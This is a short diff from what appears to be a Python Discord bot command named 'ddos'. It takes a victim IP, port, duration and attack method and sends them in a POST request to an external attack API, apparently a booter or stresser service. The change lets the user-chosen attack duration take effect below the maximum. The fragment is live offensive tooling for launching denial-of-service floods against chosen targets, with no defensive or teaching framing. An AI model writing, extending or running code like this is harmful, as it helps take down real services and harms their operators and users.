@@ -172,7 +172,7 @@ async def ddos(ctx, method : str = None, victim : str = None, port : str = None,
                         time2 = max_time
 
                     else:
-                        time2 = max_time
+                        time2 = int(time)
 
                     async with aiohttp.ClientSession() as session:
                         await session.post(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time2}&method={method.upper()}')
